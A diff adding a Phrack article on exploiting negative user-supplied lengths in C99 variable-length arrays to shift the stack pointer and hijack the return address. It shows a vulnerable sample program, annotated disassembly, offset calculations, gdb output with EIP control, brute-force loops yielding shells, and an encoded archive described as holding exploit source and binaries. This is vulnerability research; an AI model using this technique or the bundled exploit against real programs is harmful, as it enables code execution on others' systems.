@@ -1,0 +1,615 @@
+
+                           ==Phrack Inc.==
+
+              Volume 0x0b, Issue 0x3f, Phile #0x0e of 0x14
+
+
+|=----=[ Clutching at straws: When you can shift the stack pointer ]=----=|
+|=-----------------------------------------------------------------------=|
+|=----------=[ Andrew Griffiths <andrewg@felinemenace.org> ]=------------=|
+
+--[ Table of contents
+
+1 - Introduction
+2 - The story
+2.1 - C99 standard note
+3 - Breakdown
+4 - Moving on
+4.1 - Requirements for exploitability
+5 - Links
+6 - Finishing up
+
+--[ 1 - Introduction
+
+	The paper documents a rare, but none-the less interesting bug in 
+	variable sized arrays in C. This condition appears when a user 
+	supplied length is passed via a parameter to a variable 
+	declaration in a function. 
+
+	As a result of this, an attacker may be able to "shift" the stack
+	pointer to point it to somewhere unexpected, such as above
+	the stack pointer, or somewhere else like the Global Offset
+	Table. 
+
+--[ 2 - The story
+
+	After playing a couple rounds of pool and drinking at a local 
+	pub, nemo talked about some of the fruits after the days auditing
+	session. He mentioned that there was some interesting code 
+	constructs which he hadn't fully explored yet (perhaps because 
+	I dragged him out drinking).
+
+	Basically, the code vaguely looked like: 
+
+	int function(int len, some_other_args)
+	{
+		int a;
+		struct whatever *b; 
+		unsigned long c[len];
+		
+		if(len > SOME_DEFINE) { 
+			return ERROR;
+		} 
+
+		/* rest of the code */
+	}
+
+	and we started discussing about that, and how we could take 
+	advantage of that. After various talks about the compiler emitting
+	code that wouldn't allow it, architectures that it'd work on (and 
+	caveats of those architectures), and of course, another round or 
+	two drinks, we came to the conclusion that it'd be perfectly 
+	feasible to exploit, and it would be a standard esp -= 
+	user_supplied_value;
+
+	The problem in the above code, is that if len is user-supplied 
+	it would be possible to make it negative, and move the stack 
+	pointer move closer to the top of the stack, as opposed to closer 
+	to the bottom (assuming the stack grows down.)
+
+----[ 2.1 - C99 standard note
+
+	The C99 standard allows for variable-length array declaration:
+
+	To quote, 
+
+	"In this example, the size of a variable-length array is computed 
+	 and returned from a function: 
+	 
+	 size_t fsize3 (int n)
+	 { 
+	 	char b[n+3]; //Variable length array. 
+		return sizeof b; // Execution timesizeof. 
+	 } 
+	
+	 int main() 
+	 { 
+	   size_t size; 
+	   size = fsize3(10); // fsize3 returns 13. 
+	   return 0; 
+	 }"
+	
+--[ 3 - Break down
+
+	Here is the (convoluted) C file we'll be using as an example. 
+	We'll cover more things later on in the article. 
+
+	#include <stdlib.h>
+	#include <unistd.h>
+	#include <stdio.h>
+	#include <string.h>
+	#include <sys/types.h>
+
+	int func(int len, char *stuff)
+	{
+		char x[len];
+		
+		printf("sizeof(x): %d\n", sizeof(x));
+		strncpy(x, stuff, 4);
+		return 58;
+	}
+
+	int main(int argc, char **argv)
+	{
+		return func(atoi(argv[1]), argv[2]);
+	}
+	
+	The question arises though, what instructions does the compiler 
+	generate for the func function?
+	
+	Here is the resulting disassembly from "gcc version 3.3.5 
+	(Debian 1:3.3.5-8ubuntu2)", gcc dmeiswrong.c -o dmeiswrong. 
+
+
+080483f4 <func>:
+ 80483f4: 55                   push   %ebp
+ 80483f5: 89 e5                mov    %esp,%ebp ; standard function 
+                                                ; prologue
+ 80483f7: 56                   push   %esi
+ 80483f8: 53                   push   %ebx ; preserve the appropriate 
+                                           ; register contents.
+ 80483f9: 83 ec 10             sub    $0x10,%esp ; setup local 
+                                                ; variables
+ 80483fc: 89 e6                mov    %esp,%esi ; preserve the esp 
+                                                ; register
+ 80483fe: 8b 55 08             mov    0x8(%ebp),%edx ; get the length
+ 8048401: 4a                   dec    %edx	; decrement it
+ 8048402: 8d 42 01             lea    0x1(%edx),%eax ; eax = edx + 1 
+ 8048405: 83 c0 0f             add    $0xf,%eax
+ 8048408: c1 e8 04             shr    $0x4,%eax
+ 804840b: c1 e0 04             shl    $0x4,%eax 
+
+The last three lines are eax = (((eax + 15) >> 4) << 4); This rounds up 
+and aligns eax to a paragraph boundary.
+
+ 804840e: 29 c4                sub    %eax,%esp ; adjust esp
+ 8048410: 8d 5c 24 0c          lea    0xc(%esp),%ebx ; ebx = esp + 12
+ 8048414: 8d 42 01             lea    0x1(%edx),%eax ; eax = edx + 1 
+ 8048417: 89 44 24 04          mov    %eax,0x4(%esp) ; len argument
+ 804841b: c7 04 24 78 85 04 08 movl   $0x8048578,(%esp) ; fmt string
+                                                  ; "sizeof(x): %d\n"
+ 8048422: e8 d9 fe ff ff       call   8048300 <_init+0x3c> ; printf
+
+ 8048427: c7 44 24 08 04 00 00 movl   $0x4,0x8(%esp) ; len arg to 
+ 804842e: 00                                         ; strncpy
+ 804842f: 8b 45 0c             mov    0xc(%ebp),%eax   
+ 8048432: 89 44 24 04          mov    %eax,0x4(%esp) ; data to copy
+ 8048436: 89 1c 24             mov    %ebx,(%esp)    ; where to write
+
+ ; ebx = adjusted esp + 12 (see 0x8048410)
+
+ 8048439: e8 e2 fe ff ff       call   8048320 <_init+0x5c> ; strncpy
+ 804843e: 89 f4                mov    %esi,%esp  ; restore esp
+ 8048440: b8 3a 00 00 00       mov    $0x3a,%eax ; ready to return 58 
+ 8048445: 8d 65 f8             lea    0xfffffff8(%ebp),%esp 
+				; we restore esp again, just in case it 
+				; didn't happen in the first place.
+ 8048448: 5b		       pop    %ebx
+ 8048449: 5e                   pop    %esi
+ 804844a: 5d                   pop    %ebp 
+ 804844b: c3                   ret ; restore registers and return.
+
+
+	What can we learn from the above assembly output?
+
+	1) There is some rounding done on the supplied value, thus meaning 
+           small negative values (-15 > -1) and small values (1 - 15) will 
+	   become 0. This might possibly be useful, as we'll see below.
+
+	   When the supplied value is -16 or less, then it will be possible
+	   to move the stack pointer backwards (closer to the top of the 
+	   stack).
+
+	   The instruction sub $eax, %esp at 0x804840e can be seen as add 
+	   $16, %esp when len is -16.[1]
+
+	2) The stack pointer is subtracted by the paragraph-aligned 
+	   supplied value.
+	
+	   Since we can supply an almost arbitary value to this, we can 
+	   point the stack pointer at a specified paragraph. 
+
+	   If the stack pointer value is known, we can calcuate the offset 
+	   needed to point the stack at that location in memory. This 
+	   allows us to modify writable sections such as the GOT and heap. 
+
+	3) gcc can output some wierd assembly constructs.
+	
+--[ 4 - Moving on
+
+	So what does the stack diagram look like in this case? When we 
+	reach 0x804840e (sub esp, eax) this is how it looks.
+
+			+------------+
+	0xc0000000 	|   ......   | Top of stack.
+			|   ......   |
+	0xbffff86c	| 0x08048482 | Return address
+	0xbffff868	| 0xbffff878 | Saved EBP
+	0xbffff864	|   ......   | Saved ESI 
+	0xbffff860	|   ......   | Saved EBX
+	0xbffff85c	|   ......   | Local variable space
+	0xbffff858	|   ......   | Local variable space
+	0xbffff854	|   ......   | Local variable space
+	0xbffff850 	+------------+ ESP
+	
+	To overwrite the saved return address, we need to calculate what 
+	to make it subtract by. 
+	
+	delta = 0xbffff86c - 0xbffff850
+	delta = 28
+
+	We need to subtract 12 from our delta value because of the 
+        instruction at 0x08048410 (lea 0xc(%esp),%ebx) so we end up with 16. 
+
+	If the adjusted delta was less than 16 we would end up overwriting 
+	0xbffff85c, due to the paragraph alignment. Depending what is in 
+	that memory location denotes how useful it is. In this particular 
+	case its not. If we could write more than 4 bytes, it could be 
+	useful.
+
+	When we set -16 AAAA as the arguments to dmeiswrong, we get:
+
+	andrewg@supernova:~/papers/straws$ gdb -q ./dmeiswrong
+	Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
+	(gdb) set args -16 AAAA
+	(gdb) r
+	Starting program: /home/andrewg/papers/straws/dmeiswrong -16 AAAA
+	sizeof(x): -16
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x41414141 in ?? ()
+
+	Based with the above information, an exploit can be written for 
+	dmeiswrong.c. See the attached file iyndwacyndwm.c for more 
+	information.
+
+	The attached exploit code (iyndwacyndwm.c) works on my system 
+	(gcc version: Debian 1:3.3.5-8ubuntu2, kernel: Linux supernova 
+	2.6.10-5-686 #1 Fri Jun 24 17:33:34 UTC 2005 i686 GNU/Linux) with
+	success. 
+	It may fail on the readers machine due to different initial stack 
+	layout, and different compiler options / generated code. You may 
+	need to play a bit with gdb a bit to get it working. However, this 
+	technique should work fine for other people, they may just need to 
+	play around a bit to get it working as expected.
+
+	To get it working for your system, have a look at what causes a 
+	segfault (this can be achieved with a simple 
+
+	  "for i in `seq 0 -4 -128` ; do ./dmeiswrong $i AAAA ; done" 
+
+	loop and seeing if the offset segfaults. The attached Makefile 
+	implements this loop for you when you type make bf. You can then 
+	replay the offset and args in GDB to see if EIP is pointing to 
+	0x41414141.
+
+	Then its a matter of getting the stack layout correct for so the 
+	exploit will run. In the included exploit, I've made it so it 
+	tries to determine the exact offset to where the shellcode starts. 
+	This technique is further explained in [2]. Otherwise, this 
+	technique could be done via examining the heap layout at "_start" 
+	(entry point of the executable) and looking at what is in memory 
+	from the top, and seeing the offset, as its quite possible that 
+	things have been moved around during different kernel releases.
+
+	In order to make it easier for people to play around with this 
+	technique, I've included a precompiled dmeiswrong and iyndwacyndwm 
+	files, which hopefully demonstate the problem. If iyndwacyndwm 
+	does not work for you, try iyndwacyndwm-lame which tries the 
+	standard "pick an offset from some value (like esp)" technique to 
+	try and gain code execution on the host.
+
+	I haven't performed a wide scale test against vulnerable compilers, 
+	but due to the code construct compilers would be most likely to 
+	emit, I suspect a majority of compilers which support variable 
+	sized stack arrays to be vulnerable. Thos which wouldn't be 
+	vulnerable would be those which include code to verify if this is 
+	not a problem during runtime. 
+
+	Exploitability of this type of bug appears to be feasible on other 
+	architectures, such as PPC, as I was able to get it to crash with
+	$pc being something not of my choice. (such as, 0x6f662878, and 
+	sometimes $pc would be pointing at an invalid instruction on the 
+	stack). This was done via just incrementing the value passed as 
+	the len by 4 in a loop. Make bf should point out the exploitable 
+	architectures as they should crash (eventually.)
+
+	I didn't have enough time to look into this further as the time to 
+	submit the final paper drew to close, and PPC assembly and MacOSX
+	are not my strongest skills.
+
+--[ 4.1 - Requirements for exploitability
+
+	In order for an architecture / Operating System to be exploitable, 
+	the architecture needs to support having a stack which can be moved 
+	about. If the stack contains embedded flow control information, 
+	such as saved return addresses, it makes it significantly easier 
+	to exploit, and partially less dependant on what value the stack 
+	pointer contains. This in turn increases reliability in exploits, 
+	especially remote ones.
+
+	Additionally, the compiler needs to:
+
+	- support variable sized stack arrays (which as demonstrated above, 
+	  is a feature of the C99 standard)
+
+	- not emit code that performs sanity checking of the changed stack 
+	  pointer. It is forseeable that if this issue gets a lot of public 
+	  attention, that various compiler security patches (such as 
+	  pro-police, stackguard, so fourth) will add detection of this 
+	  issue.
+
+	The direction the stack grows is not that relevant to the problem, 
+	as if the x86 stack grew upwards, the instruction at 0x804840e, 
+	would be written as addl %eax, %esp, and given the parameter len 
+	as -16 would could be rewritten as subl $16, %esp, which would 
+	allow access to the saved eip and saved frame pointer, amongst 
+	other things. 
+
+	The attached Makefile has a "bf" option which should allow you 
+	to test if your architecture is vulnerable. In order to make this 
+	work as expected, you'll need to supply the top of the stack for 
+	your architecture, and a proper shellcode. A recommended test 
+	shellcode is the trap instruction (int3 on x86, trap on ppc) which 
+	generates a particular signature when the code is executed. 
+
+	The output from the make bf command on my laptop is as follows:
+
+	andrewg@supernova:~/papers/straws/src$ make bf
+	for i in `seq 0 -4 -256` ; do ./iyndwacyndwm-lame $i ; done
+	sizeof(x): 0
+	sizeof(x): -4
+	sizeof(x): -8
+	sizeof(x): -12
+	sizeof(x): -16
+	sh-3.00$ exit
+	sizeof(x): -20
+	sh-3.00$ exit
+	sizeof(x): -24
+	sh-3.00$ exit
+	sizeof(x): -28
+	sh-3.00$ exit
+	sizeof(x): -32
+	/bin/sh: line 1: 16640 Segmentation fault      ./iyndwacyndwm-lame $i
+	sizeof(x): -36
+
+	[ snipped a bunch of Segmentation fault messages ] 	
+
+	/bin/sh: line 1: 16648 Floating point exception./iyndwacyndwm-lame $i
+	sizeof(x): -68
+	/bin/sh: line 1: 16649 Floating point exception./iyndwacyndwm-lame $i
+	sizeof(x): -72
+
+	[ snipped a bunch of Floating point exception messages and segv ] 
+
+	andrewg@supernova:~/papers/straws/src$
+
+	The make bf-trap command generates the following output:
+
+	for i in `seq 0 -4 -256` ; do ./iyndwacyndwm-lame-trap $i ; done
+	sizeof(x): 0
+	sizeof(x): -4
+	sizeof(x): -8
+	sizeof(x): -12
+	sizeof(x): -16
+	/bin/sh: line 1: 16983 Trace/breakpoint trap ./iyndwacyndwm-lame-trap $i
+	sizeof(x): -20
+	/bin/sh: line 1: 16984 Trace/breakpoint trap ./iyndwacyndwm-lame-trap $i
+	sizeof(x): -24
+
+
+--[ 5 - Links
+
+[1] http://www.eduplace.com/math/mathsteps/6/b/
+[2] http://packetstorm.linuxsecurity.com/groups/netric/envpaper.pdf
+
+--[ 6 - Finishing up
+
+I'd like to greet all of the felinemenace people ((in no particular order) 
+nevar, nemo, mercy, ash, kwine, jaguar, circut, nd and n00ne), along with 
+pulltheplug people, especially arcanum.
+
+Random greets to dme, caddis, Moby for his visual basic advice while 
+discussing this problem at the pub, and zen-parse.
+
+It kinda goes without saying, but I'd like to thank all the people who have 
+supplied feedback for my article.
+
+[ Need a challenge ? ]
+[ Visit http://www.pulltheplug.org ] 
+
+[ Want to visit Australia and want a reason? ]
+[ RUXCON is being held on 1st and 2nd of October - see you there ] 
+[ http://www.ruxcon.org.au/ ] 
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+
+begin 644 src.tar.gz
+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
